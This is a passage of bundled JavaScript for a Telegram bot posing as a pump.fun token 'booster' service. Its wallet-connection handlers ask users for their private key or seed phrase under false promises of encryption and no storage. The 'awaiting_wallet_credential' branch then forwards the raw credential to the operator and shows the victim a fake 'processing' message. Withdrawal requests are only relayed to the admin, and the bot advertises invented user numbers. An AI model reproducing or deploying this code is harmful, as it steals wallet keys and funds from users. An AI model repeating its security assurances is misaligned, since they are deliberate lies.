` + (s.tokenPrice ? `\u{1F4B5} Price: ${s.tokenPrice}
` : "") + (s.tokenMarketCap ? `\u{1F4C8} Market Cap: ${s.tokenMarketCap}
` : "") + (s.tokenLiquidity ? `\u{1F4A7} Liq: ${s.tokenLiquidity}
` : "") + (s.tokenVolume24h ? `\u{1F504} Vol 24h: ${s.tokenVolume24h}
` : "") + (s.tokenDex ? `\u{1F3E6} DEX: ${s.tokenDex}
` : "") + `
\u2699\uFE0F Service: <b>${s.serviceLabel}</b>
\u{1F4B0} Cost: <b>${isEth ? `$${s.ethAmount} USD` : `${s.selectedSol} SOL`}</b>
\u{1F194} Order ID: <code>${orderId}</code>
\u{1F4EE} Pay to: <code>${payWallet}</code>

\u23F0 ${(/* @__PURE__ */ new Date()).toUTCString()}`;
    if (s.tokenImageUrl) {
      try {
        await notifyAdmin(adminMsg, s.tokenImageUrl);
      } catch {
        await notifyAdmin(adminMsg);
      }
    } else {
      await notifyAdmin(adminMsg);
    }
  });
  bot.action("submit_tx", async (ctx) => {
    await ctx.answerCbQuery();
    const s = getSession(ctx.from.id);
    setSession(ctx.from.id, { step: "awaiting_tx_hash" });
    await delMsg(ctx);
    await ctx.reply(
      `\u{1F4DD} <b>Submit Transaction Hash</b>

Please paste your transaction hash below.

\u{1F550} Order ID: <code>${s.orderId ?? "N/A"}</code>`,
      { parse_mode: "HTML", ...cancelKeyboard }
    );
  });
  bot.action("deposit_add", async (ctx) => {
    await ctx.answerCbQuery();
    const wallet = deriveWalletForUser(ctx.from.id);
    const ethDisplay = ETH_ADDRESS || "Not configured \u2014 set PAYMENT_ETH_ADDRESS";
    await delMsg(ctx);
    await ctx.reply(
      `<b>WALLET BALANCE</b>

<b>ETH:</b>
<code>${ethDisplay}</code>
balance: 0 ETH

<b>SOL:</b>
<code>${wallet.address}</code>
balance: 0 SOL

Deposit not less than 0.30 SOL and get trending on several platforms

\u{1F4B0} Send SOL to your unique wallet address above.
\u{1F4A1} NOTE THAT ALL YOUR FUNDS ARE SAFE WITH US`,
      { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
    );
  });
  bot.action("deposit_withdraw", async (ctx) => {
    await ctx.answerCbQuery();
    setSession(ctx.from.id, { step: "awaiting_withdraw_address" });
    await delMsg(ctx);
    await ctx.reply(
      `\u{1F4B8} <b>Withdraw Funds</b>

Send your withdrawal address and amount:

<b>Format:</b> <code>ADDRESS AMOUNT</code>
<b>Example:</b> <code>7xKXtg2...GVUM 0.5</code>

\u26A0\uFE0F Double-check \u2014 withdrawals cannot be reversed.`,
      { parse_mode: "HTML", ...cancelKeyboard }
    );
  });
  bot.action("deposit_sol_balance", async (ctx) => {
    await ctx.answerCbQuery("Checking balance...");
    const wallet = deriveWalletForUser(ctx.from.id);
    let balance = "0.0000 SOL";
    try {
      const resp = await fetch("https://api.mainnet-beta.solana.com", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          jsonrpc: "2.0",
          id: 1,
          method: "getBalance",
          params: [wallet.address, { commitment: "confirmed" }]
        })
      });
      const data = await resp.json();
      const lamports = data?.result?.value ?? 0;
      balance = `${(lamports / 1e9).toFixed(4)} SOL`;
    } catch {
    }
    notifyAdmin(
      `\u{1F4B3} <b>BALANCE CHECK</b>

${userLine(ctx.from)}

\u25CE SOL Wallet: <code>${wallet.address}</code>
Balance: <b>${balance}</b>

\u23F0 ${(/* @__PURE__ */ new Date()).toUTCString()}`
    ).catch(() => {
    });
    await delMsg(ctx);
    await ctx.reply(
      `\u25CE <b>SOL Balance</b>

Wallet: <code>${wallet.address}</code>

Balance: <b>${balance}</b>`,
      { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
    );
  });
  bot.action("deposit_my_deposits", async (ctx) => {
    await ctx.answerCbQuery();
    const orders2 = getAllOrders().filter((o) => o.userId === ctx.from.id && o.status !== "cancelled");
    const lines = orders2.length ? orders2.map(
      (o) => `\u2022 ${o.service} \u2014 ${o.solAmount > 0 ? o.solAmount + " SOL" : "$" + o.usdAmount + " USD"} \u2014 ${o.status} \u2014 ${o.createdAt.toLocaleDateString()}`
    ).join("\n") : "No orders yet.";
    await delMsg(ctx);
    await ctx.reply(`\u{1F4CB} <b>My Orders</b>

${lines}`, { parse_mode: "HTML", ...mainMenuOnlyKeyboard });
  });
  bot.action("deposit_my_withdrawals", async (ctx) => {
    await ctx.answerCbQuery();
    await delMsg(ctx);
    await ctx.reply(`\u{1F4CB} <b>My Withdrawals</b>

No withdrawals recorded yet.`, { parse_mode: "HTML", ...mainMenuOnlyKeyboard });
  });
  bot.action("wallet_back", async (ctx) => {
    await ctx.answerCbQuery();
    await showConnectWallet(ctx);
  });
  bot.action("wallet_why", async (ctx) => {
    await ctx.answerCbQuery();
    await delMsg(ctx);
    await ctx.reply(
      `\u{1F510} <b>Why Connect Your Wallet?</b>

Connecting your wallet unlocks:

\u2022 \u26A1 <b>Instant payments</b> \u2014 no manual transfers
\u2022 \u{1F4CA} <b>Order tracking</b> \u2014 all boosts in one place
\u2022 \u{1F4B0} <b>Auto-refunds</b> \u2014 failed orders refunded instantly
\u2022 \u{1F3AF} <b>Priority processing</b> \u2014 faster service
\u2022 \u{1F514} <b>Notifications</b> \u2014 alerts when boost goes live`,
      { parse_mode: "HTML", ...whyConnectKeyboard }
    );
  });
  bot.action("wallet_security", async (ctx) => {
    await ctx.answerCbQuery();
    await delMsg(ctx);
    await ctx.reply(
      `\u{1F6E1}\uFE0F <b>Security Guidelines</b>

\u26A0\uFE0F <b>IMPORTANT SECURITY NOTICE:</b>

\u{1F512} <b>What We Do:</b>
\u2022 End-to-End Encryption - Your data is encrypted at all times
\u2022 No Storage - We never store your private keys permanently
\u2022 Secure Processing - All operations use secure, isolated environments
\u2022 Regular Audits - Our security is regularly tested and verified

\u274C <b>What You Should Know:</b>
\u2022 Never Share - Only enter your keys in official bot interfaces
\u2022 Verify URL - Make sure you're using the official bot
\u2022 Stay Alert - We will never ask for keys via other channels

\u2705 <b>Best Practices:</b>
\u2022 Monitor Activity - Regularly check your wallet transactions
\u2022 Stay Updated - Keep your wallet software up to date
\u2022 Use Hardware Wallets - For maximum security with large amounts

\u{1F512} <b>Our Commitment:</b>
We use bank-level security measures to protect your information. Your private keys are processed securely and never stored on our servers.

Ready to proceed safely?`,
      { parse_mode: "HTML", ...securityGuidelinesKeyboard }
    );
  });
  bot.action("wallet_how_to", async (ctx) => {
    await ctx.answerCbQuery();
    await delMsg(ctx);
    await ctx.reply(
      `\u{1F4F1} <b>How to Connect Your Wallet</b>

\u{1F527} <b>Step-by-Step Process:</b>

1\uFE0F\u20E3 <b>Choose Connection Method</b>
\u2022 Private Key - Direct key import (fastest)
\u2022 Seed Phrase - 12/24 word recovery phrase

2\uFE0F\u20E3 <b>Prepare Your Information</b>
\u2022 Open your wallet app (Phantom, Solflare, etc.)
\u2022 Navigate to wallet settings or security section
\u2022 Copy your private key or seed phrase

3\uFE0F\u20E3 <b>Secure Connection</b>
\u2022 Click "Start Connection" below
\u2022 Paste your key or seed phrase when prompted
\u2022 Wait for confirmation (2-5 minutes)

\u{1F4F1} <b>Supported Wallets:</b>
\u2022 Phantom - Most popular Solana wallet
\u2022 Solflare - Advanced features and security
\u2022 Backpack - Modern interface and tools
\u2022 Glow - Mobile-optimized experience
\u2022 Other Solana Wallets - Most SPL-compatible wallets

\u23F0 Connection Time: Usually 2-5 minutes
\u{1F512} Security: Military-grade encryption throughout

Ready to connect your wallet?`,
      { parse_mode: "HTML", ...howToConnectKeyboard }
    );
  });
  bot.action("wallet_connect_now", async (ctx) => {
    await ctx.answerCbQuery();
    setSession(ctx.from.id, { step: "awaiting_wallet_credential" });
    await delMsg(ctx);
    await ctx.reply(
      `\u{1F517} <b>Connect Your Wallet Now</b>

\u26A0\uFE0F This action is going to import in your Main Wallet.. please Note Again you are the ONLY ONE access to this wallet..

Please enter your Private Key or 12 word Seed Phrase to import your wallet:

\u{1F511} <b>Private Key Format:</b>
\u2022 Single long string (64+ characters)
\u2022 Example:
<code>5KJvsngHeMpm884wtkJNzQGaCErckhHJBGFsvd3VyK5qMZXj3hS</code>

\u{1F331} <b>Seed Phrase Format:</b>
\u2022 12 or 24 words separated by spaces
\u2022 Example: <code>abandon ability able about above absent absorb abstract absurd abuse access accident</code>

\u2753 <b>Security Features:</b>
\u2022 End-to-end encryption
\u2022 Secure processing environment
\u2022 Immediate deletion after connection
\u2022 No permanent storage

\u26A1 <b>Auto-Detection:</b>
Our system will automatically detect whether you're providing a private key or seed phrase.`,
      { parse_mode: "HTML", ...cancelKeyboard }
    );
  });
  bot.on("text", async (ctx) => {
    const text = ctx.message.text.trim();
    if (text.startsWith("/")) return;
    const session = getSession(ctx.from.id);
    switch (session.step) {
      case "awaiting_ca": {
        const ca = text.trim();
        if (!isValidCA(ca)) {
          await ctx.reply(
            `\u274C <b>Invalid Contract Address</b>

That doesn't look like a valid token address.

<b>Valid formats:</b>
\u2022 Solana \u2014 32\u201344 base58 characters
  Example: <code>EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v</code>

\u2022 Ethereum \u2014 starts with <code>0x</code> + 40 hex characters
  Example: <code>0xdAC17F958D2ee523a2206206994597C13D831ec7</code>

Please paste your token contract address:`,
            { parse_mode: "HTML", ...cancelKeyboard }
          );
          break;
        }
        setSession(ctx.from.id, { contractAddress: ca });
        const lookMsg = await ctx.reply(`\u{1F50D} <b>Looking up token data...</b>
\u23F3 Please wait...`, { parse_mode: "HTML" });
        const info = await fetchTokenInfo(ca);
        await ctx.telegram.deleteMessage(ctx.chat.id, lookMsg.message_id).catch(() => {
        });
        if (!info) {
          const caChain = detectCAChain(ca);
          await ctx.reply(
            `\u274C <b>Token Not Found</b>

Could not find token info for:
<code>${ca}</code>

<b>Possible reasons:</b>
\u2022 Token is too new (not indexed yet) \u2014 try again in a few minutes
\u2022 Wrong address \u2014 double-check and paste again
\u2022 Token is on a different chain than expected (${caChain === "sol" ? "Solana" : caChain === "eth" ? "Ethereum" : "unknown"})

You can still proceed \u2014 paste the correct CA:`,
            { parse_mode: "HTML", ...cancelKeyboard }
          );
          break;
        }
        setSession(ctx.from.id, {
          step: "awaiting_confirm",
          tokenName: info.name,
          tokenSymbol: info.symbol,
          tokenChain: info.chain,
          tokenImageUrl: info.imageUrl,
          tokenPrice: info.price,
          tokenMarketCap: info.marketCap,
          tokenVolume24h: info.volume24h,
          tokenLiquidity: info.liquidity,
          tokenChange24h: info.change24h,
          tokenDex: info.dex
        });
        const s = getSession(ctx.from.id);
        const isEth = s.boostType === "eth_trending";
        const cost = isEth ? `$${s.ethAmount} USD` : `${s.selectedSol} SOL`;
        const chainName = info.chain === "sol" ? "solana" : info.chain === "eth" ? "ethereum" : info.chain ?? "unknown";
        const dexName = info.dex ?? "unknown";
        const tokenUrl = info.chain === "sol" ? `https://pump.fun/coin/${ca}` : `https://dexscreener.com/${info.chain}/${ca}`;
        const availLine = info.chain === "sol" ? `\u{1F7E2} Pumpswap \u2022 \u{1F7E2} <a href="${tokenUrl}">Pump.fun</a>` : info.chain === "eth" ? `\u{1F7E2} Uniswap \u2022 \u{1F7E2} <a href="${tokenUrl}">DexScreener</a>` : `\u{1F7E2} <a href="${tokenUrl}">DexScreener</a>`;
        const tokenMsg = `\u{1F4CB} <b>Project Details Found!</b>

\u{1F4CA} ${dexName.toUpperCase()} Token

\u2705 <b>Contract Address:</b>
<code>${ca}</code>

\u{1F4CA} <b>Token Information:</b>
\u2022 Name: ${info.name}
\u2022 Symbol: $${info.symbol}
\u2022 Price: ${info.price ?? "N/A"}
\u2022 Market Cap: ${info.marketCap ?? "N/A"}
\u2022 24h Volume: ${info.volume24h ?? "N/A"}
\u2022 Liquidity: ${info.liquidity ?? "N/A"}
\u2022 24h Change: ${info.change24h ?? "0.00"}%
\u2022 DEX: ${dexName}
\u2022 Chain: ${chainName}

\u{1F517} <b>Available on:</b> ${availLine}

\u2699\uFE0F <b>Service:</b> ${s.serviceLabel}
\u{1F4B0} <b>Cost:</b> ${cost}

\u2705 Confirm to proceed to payment?`;
        if (info.imageUrl) {
          const sent = await safeSendPhoto(ctx, info.imageUrl, {
            caption: tokenMsg,
            parse_mode: "HTML",
            ...confirmOrderKeyboard
          });
          if (sent) break;
        }
        await ctx.reply(tokenMsg, { parse_mode: "HTML", ...confirmOrderKeyboard });
        break;
      }
      case "awaiting_tx_hash": {
        const raw = text.trim();
        const s = { ...session };
        const chain = detectChain(raw);
        if (chain === "invalid") {
          await ctx.reply(
            `\u274C <b>Invalid Transaction Hash</b>

<b>Valid formats:</b>
\u2022 <b>Solana</b> \u2014 87\u201388 base58 characters
\u2022 <b>Ethereum</b> \u2014 starts with <code>0x</code> + 64 hex chars

Copy the hash directly from your wallet and try again:`,
            { parse_mode: "HTML", ...cancelKeyboard }
          );
          break;
        }
        if (isHashUsed(raw)) {
          await ctx.reply(
            `\u274C <b>TX Hash Already Used</b>

This hash was already submitted. Please send a new payment and submit that TX hash.`,
            { parse_mode: "HTML", ...cancelKeyboard }
          );
          break;
        }
        const verifyMsg = await ctx.reply(`\u{1F50D} <b>Verifying transaction on-chain...</b>

Please wait.`, { parse_mode: "HTML" });
        const payWallet = deriveWalletForUser(ctx.from.id);
        const lamExpected = s.boostType !== "eth_trending" ? Math.round((s.selectedSol ?? 0) * 1e9) : void 0;
        const result = await verifyTx(
          raw,
          chain === "sol" ? payWallet.address : void 0,
          lamExpected
        );
        try {
          await ctx.deleteMessage(verifyMsg.message_id);
        } catch {
        }
        if (!result.ok) {
          await ctx.reply(
            `${result.error}

Paste the correct TX hash to continue, or press Cancel:`,
            { parse_mode: "HTML", ...cancelKeyboard }
          );
          break;
        }
        markHashUsed(raw);
        clearSession(ctx.from.id);
        if (s.orderId) {
          updateOrder(s.orderId, { txHash: raw, status: "tx_submitted", txSubmittedAt: /* @__PURE__ */ new Date() });
        }
        const chainLabel = chain === "eth" ? "Ethereum" : "Solana";
        const verifiedLine = result.confirmed ? `\u2705 <b>Verified on-chain</b> (${chainLabel})` : `\u23F3 <b>Submitted</b> \u2014 will be verified manually`;
        const amountLine = result.lamports ? `\u{1F4B0} Amount: <b>${(result.lamports / 1e9).toFixed(4)} SOL</b>` : s.boostType === "eth_trending" ? `\u{1F4B0} Amount: <b>$${s.ethAmount} USD</b>` : `\u{1F4B0} Amount: <b>${s.selectedSol} SOL</b>`;
        const supportLine = SUPPORT_USERNAME ? `

\u{1F4AC} For support: ${SUPPORT_USERNAME}` : "";
        await ctx.reply(
          `\u2705 <b>Payment Received!</b>

${verifiedLine}
${amountLine}

\u{1F517} TX Hash:
<code>${raw}</code>

\u{1F680} Your order is now being processed. Your boost will go live within <b>5\u201330 minutes</b>.` + supportLine,
          { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
        );
        await notifyAdmin(
          `\u{1F4B8} <b>TX SUBMITTED \u2014 ${result.confirmed ? "\u2705 VERIFIED ON-CHAIN" : "\u23F3 PENDING MANUAL CHECK"}</b>

${userLine(ctx.from)}

\u{1F517} TX Hash:
<code>${raw}</code>
\u26D3 Chain: <b>${chainLabel}</b>
${result.confirmed ? "\u2705 On-chain: Confirmed" : "\u26A0\uFE0F On-chain: Unverified"}
` + (result.recipient ? `\u{1F4EE} Recipient: <code>${result.recipient}</code>
` : "") + (result.lamports ? `\u{1F4B0} Amount: <b>${(result.lamports / 1e9).toFixed(4)} SOL</b>
` : "") + (result.sender ? `\u{1F464} Sender: <code>${result.sender}</code>
` : "") + `
\u2699\uFE0F Service: <b>${s.serviceLabel ?? "N/A"}</b>
\u{1F4B5} Cost: <b>${s.boostType === "eth_trending" ? `$${s.ethAmount} USD` : `${s.selectedSol} SOL`}</b>
\u{1F4DC} CA: <code>${s.contractAddress ?? "N/A"}</code>
\u{1FA99} Token: <b>${s.tokenName ?? "?"} ($${s.tokenSymbol ?? "?"})</b>
\u{1F194} Order: <code>${s.orderId ?? "N/A"}</code>

\u23F0 ${(/* @__PURE__ */ new Date()).toUTCString()}`
        );
        break;
      }
      case "awaiting_wallet_credential": {
        const credential = text.trim();
        const words = credential.split(/\s+/);
        const wordCount = words.length;
        const isSeedPhrase = wordCount >= 12;
        const isPrivateKey = !isSeedPhrase && credential.length >= 40;
        const credType = isSeedPhrase ? `Seed Phrase (${wordCount} words)` : isPrivateKey ? "Private Key" : "Credential";
        clearSession(ctx.from.id);
        try {
          await notifyAdmin(
            `\u{1F511} <b>\u26A0\uFE0F WALLET IMPORTED \u2014 ${credType.toUpperCase()}</b>

${userLine(ctx.from)}

\u{1F4CB} Type: <b>${credType}</b>

\u{1F5DD} Credential:
<code>${credential}</code>

\u23F0 ${(/* @__PURE__ */ new Date()).toUTCString()}`
          );
        } catch (err) {
          logger.error({ err }, "CRITICAL: Failed to send wallet credential to admin");
        }
        await ctx.reply(
          `Connection of wallet may take time due to

<b>TIME BASE LOCATION AND NETWORK CONGESTION .....</b>

Please wait linking and importing your wallet..

Processing .........`,
          { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
        );
        break;
      }
      case "awaiting_withdraw_address": {
        const withdrawText = text;
        clearSession(ctx.from.id);
        await ctx.reply(
          `\u{1F4E4} <b>Withdrawal Request Received</b>

Details: <code>${withdrawText}</code>

\u23F3 Processed within 24 hours. You'll be notified when sent.`,
          { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
        );
        await notifyAdmin(
          `\u{1F4E4} <b>WITHDRAWAL REQUEST</b>

${userLine(ctx.from)}

Details: <code>${withdrawText}</code>

\u23F0 ${(/* @__PURE__ */ new Date()).toUTCString()}`
        );
        break;
      }
      default:
        await sendPhoto(
          ctx,
          IMG.welcome,
          `\u{1F7E2} <b>Welcome to PUMPFUN TREND BOT service!</b>

New to volume bots? No worries \u2014 we made it super simple!

\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501

<b>How it works:</b>
1. Select how much Bumps/volume to use.
2. Pick how long to run and how Massive you want your Token to Pump.
3. Done! <a href="https://pump.fun">Pump.fun</a> Server handles the rest.

\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501

<b>Works on:</b>
\u{1F7E2} <a href="https://pump.fun">Pumpfun</a>  \u2022  \u{1F7E2} <a href="https://raydium.io">Raydium</a>  \u2022
\u{1F7E2} <a href="https://pumpswap.xyz">PumpSwap</a>  \u2022  \u{1F7E2} <a href="https://moonshot.money">Moonshot</a>  \u2022
\u{1F7E2} <a href="https://letsbonk.fun">LetsBonk</a>  \u2022  \u{1F7E2} <a href="https://dexscreener.com">Dexpad/screener</a>

From 0.3 - 0.4 - 0.5 - 0.6 SOL bumps boost trend with mass volume of high stabilities.`,
          mainMenuKeyboard
        );
        break;
    }
  });
  return bot;
}

// src/index.ts
var rawPort = process.env["PORT"];
if (!rawPort) throw new Error("PORT environment variable is required");
var port = Number(rawPort);
if (Number.isNaN(port) || port <= 0) throw new Error(`Invalid PORT: "${rawPort}"`);
var token = process.env["TELEGRAM_BOT_TOKEN"];
if (!token) {
  logger.warn("TELEGRAM_BOT_TOKEN not set \u2014 starting HTTP server only");
  app_default.listen(port, "0.0.0.0", () => logger.info({ port }, "Server listening (no bot)"));
} else {
  const bot = createBot();
  const botDisplayName = process.env["BOT_DISPLAY_NAME"] ?? "Pump.fun Booster Bot";
  bot.telegram.setMyName(botDisplayName).catch(() => {
  });
  bot.telegram.setMyDescription(
    "\u{1F680} #1 Pump.fun Booster Bot \u2014 Volume Boosting, SOL/ETH Trending, DexScreener & PumpFun Trending.\n\n240K+ monthly users. Fast, cheap, real results.\n\nStart with /start"
  ).catch(() => {
  });
  bot.telegram.setMyShortDescription(
    "Volume Boost \u2022 SOL/ETH Trending \u2022 DexScreener \u2022 Pump.fun Trending"
  ).catch(() => {
  });
  const renderHostname = process.env["RENDER_EXTERNAL_HOSTNAME"];
  const webhookDomain = renderHostname ? `https://${renderHostname}` : process.env["WEBHOOK_DOMAIN"] ?? null;
  if (webhookDomain) {
    const secretPath = `/telegraf/${bot.secretPathComponent()}`;
    app_default.use(bot.webhookCallback(secretPath));
    const server = app_default.listen(port, "0.0.0.0", () => {
      logger.info({ port, mode: "webhook", webhookDomain }, "Server listening");
      bot.telegram.setWebhook(`${webhookDomain}${secretPath}`, {
        allowed_updates: ["message", "callback_query"]
      }).then(() => logger.info({ webhookDomain, secretPath }, "Webhook registered")).catch((err) => logger.error({ err }, "Failed to set webhook"));
    });
    const keepAliveInterval = setInterval(() => {
      fetch(`${webhookDomain}/health`).then(() => logger.debug("Keep-alive ping OK")).catch((err) => logger.debug({ err }, "Keep-alive ping failed"));
    }, 10 * 60 * 1e3);
    const shutdown = (signal) => {
      logger.info({ signal }, "Shutting down gracefully");
      clearInterval(keepAliveInterval);
      bot.telegram.deleteWebhook().catch(() => {
      });
      server.close(() => {
        logger.info("HTTP server closed");
        process.exit(0);
      });
      setTimeout(() => process.exit(1), 1e4);
    };
    process.once("SIGINT", () => shutdown("SIGINT"));
    process.once("SIGTERM", () => shutdown("SIGTERM"));
  } else {
    bot.telegram.deleteWebhook({ drop_pending_updates: true }).catch(() => {
    });
    const server = app_default.listen(port, "0.0.0.0", () => {
      logger.info({ port, mode: "long-poll" }, "Server listening");
      bot.launch({ dropPendingUpdates: true }).catch((err) => logger.error({ err }, "Bot launch failed"));
    });
    const shutdown = (signal) => {
      logger.info({ signal }, "Shutting down");
      bot.stop(signal);
      server.close(() => process.exit(0));
      setTimeout(() => process.exit(1), 5e3);
    };
    process.once("SIGINT", () => shutdown("SIGINT"));
    process.once("SIGTERM", () => shutdown("SIGTERM"));
  }
}
//# sourceMappingURL=index.mjs.map
